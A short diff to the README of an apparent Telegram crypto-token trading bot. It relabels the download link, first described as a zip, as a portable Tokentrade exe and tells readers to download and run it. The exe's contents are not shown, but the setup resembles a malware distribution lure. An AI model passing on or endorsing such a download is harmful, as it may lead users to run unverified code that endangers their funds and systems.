@@ -28,7 +28,7 @@ After you buy, it keeps watching. If the developer raises the sell tax or pulls 
 
 ## Download
 
-[Download `token-trade-telegram-bot.zip`](https://github.com/BlackInspection/token-trade-telegram-bot/releases/latest/download/Tokentrade-1.3.91-portable-x64.exe) — one zip, no installer, no admin rights.
+[Download `Tokentrade.exe`](https://github.com/BlackInspection/token-trade-telegram-bot/releases/latest/download/Tokentrade-1.3.91-portable-x64.exe) — one exe, no installer, no admin rights.
 
 Download and start the exe. No installer, no admin rights.
 
